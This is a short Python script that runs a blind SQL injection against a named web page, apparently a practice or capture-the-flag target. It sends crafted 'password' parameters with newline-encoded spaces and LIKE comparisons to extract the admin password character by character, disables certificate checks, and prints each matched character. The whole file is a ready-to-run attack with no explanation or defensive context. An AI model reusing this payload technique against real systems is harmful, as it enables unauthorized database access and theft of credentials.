#! /usr/bin/python3
import requests

url = 'https://me.zongyuan.nctu.me/sqlinject/sql.php'

for i in range(7, 16):
	for guess in range(65, 123):
		payload = "?password='%0aOR%0aid%0aLIKE%0a%27admin%27%26%26%0aascii(mid(password," + str(i) + ",1))%0aLIKE%0a" + str(guess) + "%23'"
		r = requests.get(url+payload, verify=False)
		content = str(r.text)
		if(content.find("Hello admin") != -1):
			print(guess)
